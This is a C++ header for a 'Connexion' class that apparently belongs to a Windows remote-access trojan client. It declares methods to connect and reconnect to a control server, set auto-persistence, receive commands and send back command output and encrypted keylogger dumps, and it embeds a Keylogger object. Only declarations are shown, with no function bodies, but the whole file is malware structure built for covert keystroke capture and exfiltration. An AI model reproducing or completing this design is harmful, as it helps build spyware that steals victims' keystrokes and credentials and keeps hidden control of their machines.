#ifndef CONNEXION_H
#define CONNEXION_H

#include "master.h"
#include "../inc/Keylogger.h"

using namespace std;


class Connexion
{
    public:

        Connexion(); 
        
        INT openConnexion(); //Connect serveur or re connect to server. 

        //int main(bool is_admin, string path_prog); //Main function of client. #3
        VOID setToken(wstring token); //set a_token
        VOID setIsAdmin(BOOL is_admin);// set a_is_admin
        VOID setPathProg(wstring path_prog); // set a_path_prog
        INT setAutoPeristence(); //


        INT main(); //Main function of client. #3
        VOID sendCommandSafe(vector<string> result_of_command, BOOL encryptedData=TRUE); //send data and manage errors | encryptedData use for keylogger->dumpAllData
        VOID sendSafe(wstring data);
        wstring recvSafe(); //receives the data and manages possible errors.  and return result
        VOID checkSend(INT &status);
        
        VOID reConnect(); //re connection to the server in case of problem.
        VOID closeConnexion(); //Close connexion.

        SOCKET getSocket(); //Ghetter of socket.


    private:

        SOCKET a_sock; 
        wstring a_token;
        BOOL a_is_admin;
        wstring a_path_prog;
        Keylogger *a_keylogger = new Keylogger;
};
#endif

